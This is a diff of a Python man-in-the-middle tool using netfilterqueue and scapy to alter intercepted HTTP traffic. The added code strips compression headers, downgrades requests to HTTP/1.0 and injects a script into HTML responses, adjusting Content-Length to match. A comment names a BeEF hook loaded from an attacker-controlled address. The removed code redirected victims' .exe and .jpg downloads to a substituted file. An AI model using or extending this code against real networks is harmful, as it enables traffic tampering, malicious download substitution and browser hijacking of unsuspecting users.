@@ -3,27 +3,16 @@ import netfilterqueue
 import scapy.all as scapy
 import subprocess
 import argparse
+import re
 
-exe_ack_list = []
-jpg_ack_list = []
 destport = 80
 srcport = 80
 
-# add command line arguments to choose file type to replace, maybe name of file to replace?
-
 def get_arguments():
     parser = argparse.ArgumentParser()
-    # parser.add_argument("-u", "--url", dest="url", help="URL to Spoof")
-    # parser.add_argument("-w", "--webserver", dest="webserver", help="New webserver ip")
     parser.add_argument("-d", "--debug", dest="debug", action="store_true", help=argparse.SUPPRESS)
     parser.add_argument("-ssl", "--ssl", dest="ssl", action="store_true", help=argparse.SUPPRESS)
     options = parser.parse_args()
-    # if not options.url:
-    #     # handle error
-    #     parser.error("[-] Please specify a url to spoof, use --help for more info")
-    # if not options.webserver:
-    #     # handle error
-    #     parser.error("[-] Please specify a new webserver [X.X.X.X] , use --help for more info")
     return options
 
 def set_load(packet,load):
@@ -36,27 +25,28 @@ def set_load(packet,load):
 def process_packet(packet):
     # options = get_arguments()
     scapy_packet = scapy.IP(packet.get_payload())
+    # if scapy_packet.haslayer(scapy.Raw):
     if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:
-        # print(scapy_packet.show())
+        load = scapy_packet[scapy.Raw].load
         if scapy_packet[scapy.TCP].dport == destport:
-            print("Request")
-            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                exe_ack_list.append(scapy_packet[scapy.TCP].ack)
-            elif ".jpg" in scapy_packet[scapy.Raw].load:
-                print("[+] jpg Request")
-                jpg_ack_list.append(scapy_packet[scapy.TCP].ack)
+            print("[<] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n","",load)
+            load = load.replace("HTTP/1.1","HTTP/1.0")
+            new_packet = set_load(scapy_packet, load)
+            print(new_packet.show())
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == srcport:
-            print("Response")
-            if scapy_packet[scapy.TCP].seq in exe_ack_list:
-                exe_ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file with exe")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.7-zip.org/a/7z1900.exe\n\n")
-                
-                packet.set_payload(str(modified_packet))
-            elif scapy_packet[scapy.TCP].seq in jpg_ack_list:
-                jpg_ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file with jpg")
+            print("[>>>>] Response")
+            injection_code = "<script>alert('testing');</script>" # <script src="http://10.0.2.15:3000/hook.js"></script> # beEF Hook (make sure it's running)
+            load = load.replace("</body>", injection_code + "</body>")
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+            new_packet = set_load(scapy_packet, load)
+            print(new_packet.show())
+            packet.set_payload(str(new_packet))
 
     packet.accept()
 
